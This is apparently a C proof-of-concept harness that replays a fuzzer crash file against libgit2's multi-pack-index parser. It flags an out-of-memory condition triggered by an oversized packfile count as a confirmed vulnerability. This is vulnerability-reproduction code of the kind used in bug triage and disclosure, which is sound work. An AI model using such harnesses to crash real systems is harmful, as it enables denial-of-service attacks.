#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <git2.h>
#include "midx.h"

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <crash_file>\n", argv[0]);
        return 1;
    }

    git_libgit2_init();

    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 1; }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t *data = (uint8_t *)malloc(fsize);
    if (!data) { perror("malloc"); fclose(f); return 1; }

    fread(data, 1, fsize, f);
    fclose(f);

    fprintf(stderr, "Parsing %ld bytes as MIDX...\n", fsize);

    const char *tmpfile = "/tmp/midx_poc.midx";
    FILE *tmp = fopen(tmpfile, "wb");
    if (!tmp) { perror("fopen tmpfile"); free(data); return 1; }

    /*
     * The fuzzer skips the first 4 bytes as control flags.
     * Write just the MIDX data (offset 4 onward) to disk,
     * then open it via git_midx_open which calls git_midx_parse.
     */
    if (fsize > 4) {
        fwrite(data + 4, 1, fsize - 4, tmp);
    }
    fclose(tmp);

    git_midx_file *idx = NULL;
    int oom_triggered = 0;
    int error = git_midx_open(&idx, tmpfile, GIT_OID_SHA1);
    if (error < 0) {
        const git_error *e = git_error_last();
        fprintf(stderr, "git_midx_open failed: %s\n",
                e ? e->message : "unknown error");
        if (e && e->message && strstr(e->message, "memory") != NULL) {
            fprintf(stderr, "[VULNERABILITY CONFIRMED] oversized packfiles count forced OOM path\n");
            oom_triggered = 1;
        }
    } else {
        fprintf(stderr, "MIDX parsed successfully\n");
        git_midx_free(idx);
    }

    free(data);
    remove(tmpfile);
    git_libgit2_shutdown();
    printf("PoC completed\n");
    return oom_triggered ? 2 : 0;
}
